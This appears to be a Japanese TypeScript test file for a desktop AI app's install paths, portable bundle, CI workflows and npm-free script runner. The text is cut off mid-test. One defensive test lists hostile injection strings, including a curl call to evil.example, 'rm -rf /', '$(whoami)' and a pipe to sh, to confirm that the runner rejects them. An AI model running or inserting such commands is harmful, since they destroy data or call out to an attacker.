/**
 * 置き場所の決め方。
 *
 * 三つの事情（全角のユーザー名・ASCII への設置・持ち運び）が
 * どれも「根を移したい」だけなので、根を一つにしてある。
 */
import { test, describe, afterEach, before } from 'node:test';
import assert from 'node:assert/strict';
import { homedir } from 'node:os';
import { join } from 'node:path';
import { writeFile, readFile } from 'node:fs/promises';
import { existsSync } from 'node:fs';
import { execFile } from 'node:child_process';
import { tempDir } from './tmp.ts';
import { aasHome, stateDir, binDir, modelsDir, isPortable, installRoot, isAsciiPath, asciiModelsDir, insideDir } from '../src/core/home.ts';
import { lookup, toCommand } from '../scripts/run.mjs';

/**
 * 作業場にしか無いものを見る試験の印。
 *
 * CI の設定も、用意用も、bundle には**入れるべきでない**。
 * だからbundle の中で走らせると、確かめようがない。
 * そこで落とすのは嘘（何も壊れていない）なので、飛ばしてそう言う。
 */
const sourceOnly = existsSync(join(installRoot(), '.github'))
  ? {}
  : { skip: '作業場にしか無いものを見る試験です（bundle では確かめられません）' };

/**
 * git に聞く試験だけに付ける条件。
 *
 * 取り出し方（.gitattributes）を確かめるには git が要る。ZIP で落とした
 * ものには `.git` が無いので、そこで落とすのは嘘になる。
 */
const gitOnly = existsSync(join(installRoot(), '.git'))
  ? {}
  : { skip: 'git のクローンでしか確かめられません' };

const KEYS = ['AAS_HOME', 'AAS_STATE_DIR', 'AAS_BIN_DIR', 'AAS_MODELS_DIR'];
/*
 * **入れた機械の env を持ち込まない。**
 *
 * ここは `afterEach` でしか消していなかったので、**外から `AAS_HOME` が
 * 立っている場所では、一つ目の試験がそのまま落ちる。**
 * インストーラが書く入口は `set "AAS_HOME=%COMMONPROGRAMDATA%\AdaptiveAIStudio"`
 * を立てるので、**入れた機械では selftest が毎回 NG と言う。**
 * 壊れていないのに壊れていると言うテストは、あるほうが悪い。
 * 始める前に消す（走らせる場所で結果が変わらないようにする）。
 */
for (const k of KEYS) delete process.env[k];
afterEach(() => { for (const k of KEYS) delete process.env[k]; });

describe('根の決め方', () => {
  // 置かれ方で答えが変わる関数なので、**どこに置かれているか**を毎回渡す。
  // 渡さずに書くと、持ち運び版の中で走らせたときだけ落ちる試験になる
  // （実際に一度そうなった。走らせる場所で結果が変わる試験は、試験ではない）。
  let plain: string;
  before(async () => { plain = await tempDir('aas-plain-'); });

  test('何も指定しなければ ~/.aas', () => {
    assert.equal(aasHome(plain), join(homedir(), '.aas'));
  });

  test('AAS_HOME を書けば、記録も実行ファイルもモデルも一度に移る', () => {
    process.env.AAS_HOME = join('C:', 'AAS');
    assert.equal(stateDir(plain), join('C:', 'AAS'));
    assert.equal(binDir(plain), join('C:', 'AAS', 'bin'));
    assert.equal(modelsDir(plain), join('C:', 'AAS', 'models'));
  });

  test('空の指定は無視する（消し忘れで ~/.aas を見失わない）', () => {
    process.env.AAS_HOME = '   ';
    assert.equal(aasHome(plain), join(homedir(), '.aas'));
  });

  test('個別の指定は今までどおり効く。設定済みの人を壊さない', () => {
    process.env.AAS_HOME = join('C:', 'AAS');
    process.env.AAS_MODELS_DIR = join('D:', 'gguf');
    assert.equal(modelsDir(plain), join('D:', 'gguf'), '個別の指定が根に負けている');
    assert.equal(binDir(plain), join('C:', 'AAS', 'bin'), '指定していない方まで動いている');
  });
});

describe('持ち運び版', () => {
  test('目印があれば、隣に置く。環境変数は要らない', async () => {
    const root = await tempDir('aas-portable-');
    await writeFile(join(root, '.portable'), '');
    assert.equal(isPortable(root), true);
  });

  test('目印が無ければ持ち運び版ではない', async () => {
    const root = await tempDir('aas-normal-');
    assert.equal(isPortable(root), false);
  });

  test('AAS_HOME があれば、持ち運びより明示が勝つ', async () => {
    const root = await tempDir('aas-portable-');
    await writeFile(join(root, '.portable'), '');
    process.env.AAS_HOME = join('C:', 'AAS');
    assert.equal(aasHome(root), join('C:', 'AAS'));
  });
});

describe('用意する道具', () => {
  test('バッチは CRLF で配ると宣言してある', sourceOnly, async () => {
    // LF のままだと cmd.exe が goto や括弧の塊を読み違える。
    // ただし**作業コピーのバイトを見てはいけない**。取り出すときに git が
    // 直すので、見る場所を間違えると走らせる環境で結果が変わる試験になる。
    // 保証しているのは .gitattributes なので、そちらを見る。
    const raw = await readFile(join(installRoot(), '.gitattributes'), 'utf8');
    assert.match(raw, /^\*\.cmd\s+text\s+eol=crlf/m, 'cmd を CRLF で配る宣言が無い');
  });

  /**
   * **取り出したときの行末が、どの機械でも同じであること。**
   *
   * 既定のままだと Windows の git が CRLF に直す。リポジトリの文章を読んで
   * `\n` を探す試験は、そこでだけ当たらなくなる。同じことで二度落ちた
   * （DECISIONS の読む順、README のメニューの番号）。一度目は読む側で
   * そろえて直したが、**二度目も読む側で書いてしまった。**
   * 直す場所を取り出しの側へ移し、ここで止める。
   *
   * 宣言の文字を見るのではなく、**git に聞く。**書いてあっても、
   * 後の行に負けていれば効かない。
   */
  test('**文章は LF で取り出す。バッチだけ CRLF**', gitOnly, async () => {
    const asked = await new Promise<string>((done, fail) => {
      execFile('git', ['check-attr', 'eol', '--', 'README.md', 'docs/DECISIONS.md', 'start.cmd'],
        { cwd: installRoot() }, (err, out) => (err ? fail(err) : done(out)));
    });
    assert.match(asked, /^README\.md: eol: lf$/m, 'README が LF で取り出されない');
    assert.match(asked, /^docs\/DECISIONS\.md: eol: lf$/m, 'docs が LF で取り出されない');
    assert.match(asked, /^start\.cmd: eol: crlf$/m, 'バッチが CRLF で取り出されない');
  });

});

describe('npm 無しで仕事を動かす', () => {
  test('package.json に載っている仕事を引ける', async () => {
    assert.equal(typeof await lookup('doctor'), 'string');
    assert.equal(await lookup('そんな仕事はない'), undefined);
  });

  test('node で始まる仕事だけを動かせる形にする', () => {
    assert.deepEqual(toCommand('node scripts/run-tests.mjs'), ['scripts/run-tests.mjs']);
    assert.deepEqual(toCommand('node --experimental-strip-types src/cli/ui.ts'),
      ['--experimental-strip-types', 'src/cli/ui.ts']);
  });

  test('殻に渡さない。書いてある文字列を命令として実行しない', () => {
    // package.json を書き換えられる筋が、そのまま実行の筋になってはいけない。
    for (const s of [
      'node x.mjs && curl evil.example',
      'node x.mjs; rm -rf /',
      'node $(whoami).mjs',
      'node x.mjs | sh',
      'rm -rf /',
    ]) {
      assert.equal(toCommand(s), undefined, `通してしまっている: ${s}`);
    }
  });

  test('全部の仕事が、この入口から動く形になっている', async () => {
    // 一つでも npm を要る形にすると、持ち運び版でそこだけ動かなくなる。
    const pkg = JSON.parse(await readFile(join(installRoot(), 'package.json'), 'utf8'));
    for (const [name, script] of Object.entries(pkg.scripts as Record<string, string>)) {
      assert.ok(toCommand(script), `npm 無しでは動かせない仕事: ${name} → ${script}`);
    }
  });
});

/*
 * **200MB を、試験ごとに組み直さない。**
 *
 * ここは bundle を 11 回組んでいた。この機械で 105 秒のうち大半がこれで、
 * 配る先（Windows・同期フォルダの下）では 1 件で 233 秒かかって落ちた。
 * **入口の 6 番を、押せない形にしていたのは、この作り。**
 *
 * 同じ組み方のものは一度だけ組んで、読む側で使い回す。
 * 組み方（渡す条件）が違うものだけ、別に組む。
 */
const built = new Map<string, Promise<{ out: string; result: Awaited<ReturnType<typeof import('../scripts/bundle.mjs')['bundle']>> }>>();

/** 渡す偽の node.exe。中身は見ないので、一つを使い回す。 */
let fakeNodeExe: Promise<string> | undefined;
function fakeNode(): Promise<string> {
  fakeNodeExe ??= (async () => {
    const at = join(await tempDir('aas-fake-'), 'node.exe');
    await writeFile(at, 'dummy');
    return at;
  })();
  return fakeNodeExe;
}

function sharedBundle(
  key: string,
  opts: { nodeHere?: boolean; nodeExe?: string; nodeName?: string; version: string },
): Promise<{ out: string; result: Awaited<ReturnType<typeof import('../scripts/bundle.mjs')['bundle']>> }> {
  const had = built.get(key);
  if (had) return had;
  const making = (async () => {
    const out = await tempDir(`aas-bundle-${key}-`);
    const { bundle } = await import('../scripts/bundle.mjs');
    const result = await bundle({ out, srcRoot: installRoot(), ...opts });
    return { out, result };
  })();
  built.set(key, making);
  return making;
}

describe('bundle の形', () => {
  test('利用者が最初に見るものは、普通の名前になっている', async () => {
    const { out } = await sharedBundle('plain', { version: 'test-plain' });

    const { readdir } = await import('node:fs/promises');
    const top = (await readdir(out)).sort();
    // 日本語のファイル名を表に置かない。中身は日本語でよい。
    assert.deepEqual(top, ['.portable', 'AdaptiveAIStudio.cmd', 'README.txt', 'VERSION', 'app']);
  });

  test('中の道が深すぎるものを配らない', async () => {
    // Windows は道の全体が 260 文字を超えると開けない。深いまま配ると、
    // 利用者の展開が途中で止まる（実際に警告が出た）。**組むときにしか気づけない。**
    const { DEPTH_BUDGET } = await import('../scripts/bundle.mjs');
    const { out, result: r } = await sharedBundle('plain', { version: 'test-plain' });
    assert.ok(r.deepest <= DEPTH_BUDGET, `深すぎます: ${r.deepest} > ${DEPTH_BUDGET}`);
    // 置き場所に使える文字数を、README に書いてあること。
    // 数字だけ合っていても、読む所に無ければ利用者には届かない。
    const readme = await readFile(join(out, 'README.txt'), 'utf8');
    const room = (260 - 1) - 1 - r.deepest;
    assert.match(readme, new RegExp(`${room} 文字までにしてください`), readme.slice(0, 400));
  });

  test('版は VERSION に、そのまま書いてある', async () => {
    const { out } = await sharedBundle('plain', { version: 'test-plain' });
    assert.equal((await readFile(join(out, 'VERSION'), 'utf8')).trim(), 'test-plain');
  });

  test('版を渡さなくても、手元の印まで書く', sourceOnly, async () => {
    // 手元で組んだものが全部 0.1.0 では、どの中身で組んだか辿れない。
    // git の作業コピーでしか確かめられない。bundle の中では落ちる（実際に落ちた）。
    const { guessVersion } = await import('../scripts/bundle.mjs');
    const v = guessVersion(installRoot());
    // ここは git の作業コピー。package.json の版に短い印が付く。
    assert.match(v, /^\d+\.\d+\.\d+\+[0-9a-f]{7,}/, `印が付いていない: ${v}`);
  });

  test('git に訊けない場所では、package.json の版だけ（対）', async () => {
    const { guessVersion } = await import('../scripts/bundle.mjs');
    const dir = await tempDir('aas-nogit-');
    await writeFile(join(dir, 'package.json'), '{"version":"9.9.9"}');
    assert.equal(guessVersion(dir), '9.9.9');
  });

  test('data は app の外に出る', async () => {
    const { out } = await sharedBundle('plain', { version: 'test-plain' });
    // 中身（app）の中に記録が混ざると、更新のたびに巻き添えで消える。
    assert.equal(aasHome(join(out, 'app')), join(out, 'data'));
  });
});

describe('CI の使い方', () => {
  test('押すたびにbundle を組み立てない', sourceOnly, async () => {
    // Windows の枠は2倍で数えられる。前に使い切って1日検査できなくなった。
    const raw = await readFile(join(installRoot(), '.github', 'workflows', 'release.yml'), 'utf8');
    // 印（タグ）と、印と同じ意味のブランチ（release/v*）でだけ回す。main や普通のブランチでは回さない。
    // release/v* を許すのは、作業場によってはタグを押せない（中継が落とす）ため。
    const branches = [...raw.matchAll(/^\s*branches:\s*\[([^\]]*)\]/gm)].map((m) => (m[1] ?? "").trim());
    assert.deepEqual(branches, ["'release/v*'"], '印以外のブランチへの push で組み立てている');
    assert.match(raw, /tags:/, 'タグでしか回らない形になっていない');
  });

  test('続けて押したら、前のものは打ち切る', sourceOnly, async () => {
    for (const f of ['ci.yml', 'release.yml']) {
      const raw = await readFile(join(installRoot(), '.github', 'workflows', f), 'utf8');
      assert.match(raw, /cancel-in-progress:\s*true/, `${f} に打ち切りが無い`);
    }
  });

  test('文書だけの変更では検査を回さない', sourceOnly, async () => {
    const raw = await readFile(join(installRoot(), '.github', 'workflows', 'ci.yml'), 'utf8');
    assert.match(raw, /paths-ignore/);
  });

  /*
   * **配布物に GPU 用の binary を入れる。**CPU の分だけだった間、RTX の機械でも
   * CPU で回り、記憶を使い切って答えなかった。portable と setup.exe の両方に。
   * 在るかどうかは `test -f` で組んだ後に見る（入れたつもりで欠けていた形を配ったことがある）。
   */
  test('配布物には CPU・CUDA・Vulkan の三つの binary を入れ、組んだ後に在ることを見る', sourceOnly, async () => {
    // Windows の checkout は CRLF になる。行の続き（`\\` の直後）を LF で探すと、
    // 一行目で切れて「入れていない」と嘘を言う（Windows の CI で実際にそう落ちた）。
    const raw = (await readFile(join(installRoot(), '.github', 'workflows', 'release.yml'), 'utf8')).replace(/\r\n/g, '\n');
    const installs = raw.match(/npm install[^\n]*\n(?:\s+[^\n]*\\\n)*[^\n]*/g) ?? [];
    assert.ok(installs.length >= 2, `入れる所が ${installs.length} か所しか無い（portable と setup.exe）`);
    for (const step of installs) {
      for (const pkg of ['@node-llama-cpp/win-x64', '@node-llama-cpp/win-x64-cuda', '@node-llama-cpp/win-x64-vulkan']) {
        assert.ok(step.includes(pkg), `${pkg} を入れていない:\n${step}`);
      }
    }
    for (const dll of ['win-x64-cuda/bins/win-x64-cuda/ggml-cuda.dll', 'win-x64-vulkan/bins/win-x64-vulkan/ggml-vulkan.dll']) {
      assert.ok(raw.includes(`test -f node_modules/@node-llama-cpp/${dll}`), `${dll} が在ることを見ていない`);
    }
    // 組んだ後（zip・setup.exe の中）も見る。
    assert.ok((raw.match(/win-x64-cuda\/bins\/win-x64-cuda\/llama-addon\.node/g) ?? []).length >= 3, '組んだ後の中身を見ていない');
    const installer = await readFile(join(installRoot(), 'scripts', 'installer.mjs'), 'utf8');
    assert.ok(installer.includes('@node-llama-cpp/win-x64-cuda') && installer.includes('@node-llama-cpp/win-x64-vulkan'),
      '手元で組む installer.mjs が GPU 用を入れていない');
  });
});

/**
 * `ci.yml` を仕事ごとに切る。
 *
 * **注釈を先に落とす。**落とさずに切ると、次の仕事の頭に付いている注釈が
 * 前の仕事の塊に入る。そのせいで「Windows でテストを回す仕事」を探す条件
 * （`check:bundle` を含まない）が、隣の注釈に書いてある語で外れた。
 */
function ciJobs(raw: string): string[] {
  const body = raw.slice(raw.indexOf('\njobs:'))
    .split('\n').filter((l) => !/^\s*#/.test(l)).join('\n');
  return body.split(/\n  (?=[a-z][\w-]*:\n)/).slice(1);
}

describe('CI は押すたびに回さない', () => {
  test('push では回らない', sourceOnly, async () => {
    // 1回あたりを安くしても、回数が減らなければ意味がない。
    // 直しを10回押せば10回回る、という作りが枠を使い切った元凶だった。
    const raw = await readFile(join(installRoot(), '.github', 'workflows', 'ci.yml'), 'utf8');
    const on = raw.slice(raw.indexOf('\non:'), raw.indexOf('\njobs:'));
    assert.equal(/^\s{2}push:/m.test(on), false, 'push で回る形になっている');
  });

  test('PR と手動と週1回では回る', sourceOnly, async () => {
    const raw = await readFile(join(installRoot(), '.github', 'workflows', 'ci.yml'), 'utf8');
    const on = raw.slice(raw.indexOf('\non:'), raw.indexOf('\njobs:'));
    for (const trigger of ['pull_request:', 'workflow_dispatch:', 'schedule:']) {
      assert.match(on, new RegExp(trigger), `${trigger} が無い`);
    }
  });

  test('週1回の時刻は、JST で決めてから UTC に直してある', sourceOnly, async () => {
    // JST の何時かを先に決めないと、1日ずれる（実際に一度ずらした）。
    const raw = await readFile(join(installRoot(), '.github', 'workflows', 'ci.yml'), 'utf8');
    const cron = /cron:\s*'([^']+)'/.exec(raw)?.[1];
    assert.ok(cron, 'cron が無い');
    const [, hourUtc, , , dowUtc] = cron!.split(' ');
    // JST = UTC+9。土曜 09:00 JST → 土曜 00:00 UTC。
    assert.equal(hourUtc, '0');
    assert.equal(dowUtc, '6', 'JST の土曜にしたいなら UTC も土曜（0時なので日をまたがない）');
  });

  /**
   * **draft のうちは Windows を回さない。**
   *
   * Windows は2倍で数えられる。draft は「まだ見せていない」という合図なのに、
   * そこへ押すたびに Linux と Windows の両方が回っていた。直しを 3 回押しただけで
   * Windows が 3 回走る（この PR で実際に 3 回押した）。
   *
   * 回数だけを減らす。**見る中身は減らさない**（Ready にした時点で全部回る）。
   */
  test('**draft の PR では Windows を回さない。Ready にしたら回る**', sourceOnly, async () => {
    const raw = (await readFile(join(installRoot(), '.github', 'workflows', 'ci.yml'), 'utf8')).replace(/\r\n/g, '\n');
    // Windows で `npm test` を回す仕事に、draft を除く条件が付いていること。
    const jobs = ciJobs(raw);
    const winTest = jobs.find((j) => /runs-on: windows-latest/.test(j) && /npm test/.test(j) && !/check:bundle/.test(j));
    assert.ok(winTest, 'Windows でテストを回す仕事が見つからない');
    // PR では一度も回さない（週に一度と手で頼んだときだけ）。
    assert.match(winTest, /github\.event_name != 'pull_request'/,
      `PR を除く条件が無い（毎日の PR で2倍で回る）:\n${winTest.slice(0, 400)}`);
    // Ready にした時点で回るように、合図に ready_for_review が入っていること。
    const on = raw.slice(raw.indexOf('\non:'), raw.indexOf('\njobs:'));
    assert.match(on, /types:\s*\[[^\]]*ready_for_review/,
      'ready_for_review が無い。draft を外しても Windows が回らない');
    // 安い方（Linux）は押すたびに回す。止めるのは「draft で開いた」その一回だけ
    // （開いてすぐ Ready にすると、Ready の回に打ち切られて途中までの分を払うだけになる）。
    const linuxTest = jobs.find((j) => /runs-on: ubuntu-latest/.test(j) && /npm test/.test(j));
    assert.ok(linuxTest, 'Linux でテストを回す仕事が見つからない');
    const cond = /if: >-\n([\s\S]*?)\n    runs-on:/.exec(linuxTest)?.[1] ?? /if: (.*)/.exec(linuxTest)?.[1] ?? '';
    assert.doesNotMatch(cond, /draft != true/, 'Linux 側まで draft の間ずっと止めている（安い方は押すたびに回す）');
    // **否定まで見る。**`!(` を落とすと、Linux は draft で開いた回にだけ回り、他の回では全部飛ぶ。
    assert.match(cond, /&& !\(github\.event\.action == 'opened' && github\.event\.pull_request\.draft == true\)/,
      `draft で開いた回だけを止める条件（否定付き）が無い:\n${cond}`);
  });

  test('どの仕事にも上限がある（暴走した1本で枠を溶かさない）', sourceOnly, async () => {
    const raw = (await readFile(join(installRoot(), '.github', 'workflows', 'ci.yml'), 'utf8')).replace(/\r\n/g, '\n');
    const jobs = ciJobs(raw);
    assert.ok(jobs.length >= 4, `仕事が ${jobs.length} つしか読めていない`);
    for (const job of jobs) {
      const name = /^\s*([a-z][\w-]*):/.exec(job)?.[1] ?? '(不明)';
      assert.match(job, /timeout-minutes:\s*\d+/, `${name} に timeout-minutes が無い`);
    }
  });
});

/** バッチは CP932 で置いてある（cmd.exe がそう読むため）。合わせて読む。 */
const cmd = (bytes: Uint8Array) => new TextDecoder('shift_jis').decode(bytes);

describe('npm 無しの入口（scripts/run.mjs）', () => {
  test('入口の判定に file:// を継ぎ足さない', async () => {
    // Windows では argv[1] が Z:\...\run.mjs、import.meta.url は
    // file:///Z:/.../run.mjs。`file://` + argv[1] では一致しないので、
    // **中身が丸ごと動かない**。何も言わず終了コード0で終わるため
    // 気づけない（実機でそうなった。画面が開かなかった）。
    for (const name of ['run.mjs', 'bundle.mjs']) {
      const src = await readFile(join(installRoot(), 'scripts', name), 'utf8');
      assert.doesNotMatch(src, /`file:\/\/\$\{process\.argv\[1\]\}`/,
        `scripts/${name} が file:// を継ぎ足している。pathToFileURL を使う`);
      if (/process\.argv\[1\]/.test(src)) {
        assert.match(src, /pathToFileURL\(process\.argv\[1\]\)\.href/,
          `scripts/${name} が pathToFileURL を使っていない`);
      }
    }
  });

  test('**リンクを挟んだ道から起こしても、入口の中身が動く**', async () => {
    // Node は起こしたファイルを実体の道で読むので、import.meta.url は実体、argv[1] は打たれた道のまま。
    // 道の途中にリンク・junction・subst のドライブ・Windows の短い名前があると一致せず、**何もせずに 0 で終わっていた**
    // （run-tests.mjs なら、試験を一つも走らせずに「通った」になる）。名前を付けずに起こすと、使い方を言って 2 で終わるはず
    const { symlink } = await import('node:fs/promises');
    const dir = await tempDir('aas-is-main-');
    const alias = join(dir, 'scripts-alias');
    // 'junction' は Windows で管理者権限なしに作れる。Linux では種類は無視される
    await symlink(join(installRoot(), 'scripts'), alias, 'junction');
    const got = await new Promise<{ code: number | null; err: string }>((done) => {
      const child = execFile(process.execPath, [join(alias, 'run.mjs')], { timeout: 30_000 }, (e, _out, err) =>
        done({ code: e ? (e as { code?: number }).code ?? 1 : 0, err: String(err) }));
      void child;
    });
    assert.equal(got.code, 2, `リンク越しに起こすと中身が動いていない（終了コード ${got.code}）: ${got.err.slice(0, 200)}`);
    assert.match(got.err, /使い方/);
  });

  test('組み立てたものを、通しで動かせる', async () => {
    // これが無かったのが根本。入口が死んでいても、部品の試験は全部通る。
    // 実機では「1 を選んでも何も起きない」という形で出た。
    const { out } = await sharedBundle('here', { nodeHere: true, version: 'here' });

    const { execFile } = await import('node:child_process');
    const { promisify } = await import('node:util');
    const run = promisify(execFile);
    const { stdout } = await run(
      process.execPath,
      [join(out, 'app', 'scripts', 'run.mjs'), 'doctor'],
      { env: { ...process.env, AAS_HOME: join(out, 'data') }, timeout: 120_000 },
    );
    // 何か言っていること。黙って終わるのが、いちばん困る形。
    assert.ok(stdout.includes('doctor'), `通しで動いていない:\n${stdout.slice(0, 400)}`);
    assert.ok(stdout.includes('Node.js'), '中身が動いていない');
  });

  test('入口として動く（中身が丸ごと死んでいないこと）', async () => {
    // 静的な検査だけだと、入口そのものが無くなっても気づけない。
    const { execFile } = await import('node:child_process');
    const { promisify } = await import('node:util');
    const run = promisify(execFile);
    const at = join(installRoot(), 'scripts', 'run.mjs');
    await assert.rejects(
      () => run(process.execPath, [at, 'そんな仕事はない']),
      (e: { code?: number; stderr?: string }) => {
        assert.equal(e.code, 2, '入口が動いていない');
        assert.match(e.stderr ?? '', /そういう仕事はありません/);
        return true;
      },
    );
  });
});

describe('同梱した Node の置き場所', () => {
  // 一度、start.cmd と bundle で場所が食い違い、同梱したのに見つけられない状態だった。

  test('組み立てると runtime に入る', async () => {
    const { out, result: r } = await sharedBundle('exe', { nodeExe: await fakeNode(), version: 'x' });
    assert.equal(r.bundledNode, true);
    const { stat } = await import('node:fs/promises');
    assert.ok(await stat(join(out, 'runtime', 'node.exe')));
  });

  test('入口は、展開しただけの形（隣の runtime）も探しに行く', sourceOnly, async () => {
    const raw = cmd(await readFile(join(installRoot(), 'start.cmd')));
    // 案内の文言ではなく、探しに行く行そのものを見る。
    assert.match(raw, /if exist "%HERE%runtime\\node\.exe" set "BUNDLED=%HERE%runtime"/,
      '隣の runtime を探しに行く行が無い');
  });

  test('入口は、組み立てた場所を探しに行く', sourceOnly, async () => {
    const raw = cmd(await readFile(join(installRoot(), 'start.cmd')));
    // app\ の隣の runtime\ を見ていること。
    // ただし `..` を含んだままでは見に行かない。実機（Z: の割り当て
    // ドライブ・OneDrive の下）で、同梱したのに見つけられなかった。
    assert.match(raw, /for %%i in \("%~dp0\.\."\) do set "UP=%%~fi"/, '.. を潰していない');
    assert.match(raw, /%UP%\\runtime\\node\.exe/, '製品の形を見ていない');
  });

});

describe('落としてきたものでも、版が分かる', () => {
  test('作業コピーでは、焼き込みの印を版として見せない', async () => {
    // $Format:%H$ のまま見せると、嘘の版を報告することになる。
    const { currentVersion } = await import('../src/core/version.ts');
    const v = await currentVersion();
    assert.equal(v.id?.startsWith('$Format:'), false, `印をそのまま出している: ${v.id}`);
  });

  test('書庫に版を焼き込む宣言がある', sourceOnly, async () => {
    // これが無いと、GitHub から落とした人は「どの版か分からない」まま使う。
    const raw = await readFile(join(installRoot(), '.gitattributes'), 'utf8');
    assert.match(raw, /^VERSION\s+export-subst/m);
  });
});

describe('CI が使えなくても、bundle は作れる', () => {
  test('いま動かしている Node ごと固められる', async () => {
    // 枠を使い切ると何も確かめられなくなる、を避けるための道。
    // 取ってこない（網が要らない）ので、CI にも外にも依存しない。
    const { out, result: r } = await sharedBundle('here', { nodeHere: true, version: 'here' });
    assert.equal(r.bundledNode, true);

    const { readdir } = await import('node:fs/promises');
    const runtime = await readdir(join(out, 'runtime'));
    assert.ok(runtime.some((n) => n === 'node' || n === 'node.exe'), '同梱されていない');
  });

  test('固めたものだけで、検査を回せる形になっている', async () => {
    // 持って行った先で確かめられないなら、持って行く意味がない。
    const { out } = await sharedBundle('plain', { version: 'test-plain' });
    const { stat } = await import('node:fs/promises');
    for (const p of ['app/scripts/run-tests.mjs', 'app/test', 'app/src']) {
      assert.ok(await stat(join(out, ...p.split('/'))), `入っていない: ${p}`);
    }
  });
});

describe('全角の利用者名でも、モデルは開ける場所へ置く', () => {
  // 走らせる場所で結果が変わらないよう、環境は引数で渡す。
  const env = { ProgramData: 'C:\\ProgramData' };

  test('半角だけの根は、そのまま使う', () => {
    assert.equal(asciiModelsDir('C:\\Users\\someone\\.aas', env), undefined);
  });

  test('全角が混ざる根は、モデルだけ ProgramData へ逃がす', () => {
    const got = asciiModelsDir('C:\\Users\\ｍ＠ｇｕｒｏ\\.aas', env);
    assert.equal(got, join('C:\\ProgramData', 'AdaptiveAIStudio', 'models'));
    assert.ok(isAsciiPath(got!), '逃がした先まで全角では意味がない');
  });

  test('逃がす先が無ければ、黙って動かさない', () => {
    // 見つからないのに勝手な場所を作らない。C: 直下に作るのがいちばん困る。
    assert.equal(asciiModelsDir('C:\\Users\\ｍ＠ｇｕｒｏ\\.aas', {}), undefined);
  });

  test('逃がす先自体が全角なら、逃がさない', () => {
    assert.equal(asciiModelsDir('C:\\Users\\ｍ＠ｇｕｒｏ\\.aas', { ProgramData: 'D:\\データ' }), undefined);
  });

  test('プログラムと記録は逃がさない（割れるほうが分かりにくい）', () => {
    // モデルだけが困る。他は全角の道でも読み書きできる。
    assert.equal(isAsciiPath('C:\\Users\\ｍ＠ｇｕｒｏ'), false);
    assert.equal(isAsciiPath('C:\\ProgramData\\AdaptiveAIStudio'), true);
  });
});

describe('bundle の形のまま、この中で読む設定で通す', () => {
  test('組み立てたものに GGUF を置いて doctor が通る', sourceOnly, async () => {
    // 過去の不具合は、**配った形でだけ壊れる**ものに集まっている
    // （入口が丸ごと死ぬ、置き場がずれる、繋ぎ先が埋まらない）。
    // 作業コピーで通ることは、配った形で通ることの証明にならない。
    const { out } = await sharedBundle('here', { nodeHere: true, version: 'here' });

    const { mkdir: mk, writeFile: wf } = await import('node:fs/promises');
    const models = join(out, 'data', 'models');
    await mk(models, { recursive: true });
    await wf(join(models, 'qwen2.5-3b-instruct-q4_k_m.gguf'), 'GGUF');
    const cfg = join(out, 'aas.config.json');
    await wf(cfg, JSON.stringify({ runtime: { kind: 'inproc', modelsDir: models } }));

    const { execFile } = await import('node:child_process');
    const { promisify } = await import('node:util');
    const run = promisify(execFile);
    const got = await run(
      process.execPath,
      [join(out, 'app', 'scripts', 'run.mjs'), 'doctor'],
      {
        env: { ...process.env, AAS_HOME: join(out, 'data'), AAS_CONFIG: cfg, NO_COLOR: '1' },
        timeout: 120_000,
      },
    ).catch((e: { stdout?: string; stderr?: string }) => e);
    // eslint-disable-next-line no-control-regex
    const text = `${got.stdout ?? ''}${got.stderr ?? ''}`.replace(/\x1b\[[0-9;]*m/g, '');

    assert.match(text, /qwen2\.5-3b-instruct-q4_k_m\.gguf/, '置いた GGUF を見つけていない');
    // 繋ぎ先はこちらで埋める。利用者に書かせない。
    assert.match(text, /この中に立てます/, '繋ぎ先が埋まっていない');
    assert.doesNotMatch(text, /モデルを動かす土台がまだありません/);
  });
});

/**
 * インストール版でも版が言える。
 *
 * bundle は VERSION を製品の根（app の親）に置く。setup.exe はそこから `.portable`
 * だけを消して入れる（残すと data\ が Program Files の隣に出来る）。根の見つけ方が
 * `.portable` 頼みだったので、インストール版では VERSION を見に行かず
 * 「分かりません（git の管理下でもbundle でもありません）」と出ていた（実機の doctor）。
 */
describe('インストール版（.portable 無し、中身が app\\）でも版が読める', () => {
  test('app の親の VERSION を読む', async () => {
    const { currentVersion, describeVersion } = await import('../src/core/version.ts');
    const { mkdir, writeFile } = await import('node:fs/promises');
    const root = await tempDir('aas-installed-');
    await mkdir(join(root, 'app'), { recursive: true });
    await writeFile(join(root, 'VERSION'), '0.12.0-abc1234\r\n', 'utf8');
    const v = await currentVersion(join(root, 'app'));
    assert.equal(v.id, '0.12.0-abc1234');
    assert.equal(v.from, 'bundle の記録');
    assert.equal(v.builtAt, undefined, '.portable が無いので組み立て時刻は分からない');
    assert.match(describeVersion(v), /^0\.12\.0-abc1234（bundle の記録）$/);
  });

  test('中身が app\\ でなければ、親の VERSION は見ない（対）', async () => {
    // クローンが、たまたま VERSION を置いた親の下に在っても、それを版と言わない。
    const { currentVersion } = await import('../src/core/version.ts');
    const { mkdir, writeFile } = await import('node:fs/promises');
    const root = await tempDir('aas-notapp-');
    await mkdir(join(root, 'work'), { recursive: true });
    await writeFile(join(root, 'VERSION'), '9.9.9-nope\r\n', 'utf8');
    const v = await currentVersion(join(root, 'work'));
    assert.notEqual(v.id, '9.9.9-nope');
  });
});

describe('bundle を組み直すとき', () => {
  test('data（portable ではモデル・設定・会話が入っている）は残し、前に組んだものは片づける', async () => {
    const out = await tempDir('aas-rebundle-');
    const { mkdir } = await import('node:fs/promises');
    await mkdir(join(out, 'data', 'models'), { recursive: true });
    await writeFile(join(out, 'data', 'models', 'keep.gguf'), 'GGUF');
    await mkdir(join(out, 'app'), { recursive: true });
    await writeFile(join(out, 'app', 'stale.txt'), '前に組んだ残り');
    const { bundle } = await import('../scripts/bundle.mjs');
    await bundle({ out, srcRoot: installRoot(), version: 'test-rebundle', keepData: true });
    assert.equal(await readFile(join(out, 'data', 'models', 'keep.gguf'), 'utf8'), 'GGUF', '組み直したら data が消えた');
    assert.equal(existsSync(join(out, 'app', 'stale.txt')), false, '前に組んだものが残っている');
    assert.ok(existsSync(join(out, 'AdaptiveAIStudio.cmd')));
    // 頼まれなければ残さない（開発者の手元で組み直した bundle に、その人の会話やモデルを載せて配らない）
    await bundle({ out, srcRoot: installRoot(), version: 'test-rebundle' });
    assert.equal(existsSync(join(out, 'data')), false, '頼まれていないのに data を残した');
  });

  test('**組む途中で落ちたら、置いたものを消して前の版に戻す**（前の版を先に消していたので、動く版が一つも残らなかった）', async () => {
    const out = await tempDir('aas-rebundle-fail-');
    const { readdir } = await import('node:fs/promises');
    const { bundle } = await import('../scripts/bundle.mjs');
    await bundle({ out, srcRoot: installRoot(), version: 'test-good' });
    const { mkdir } = await import('node:fs/promises');
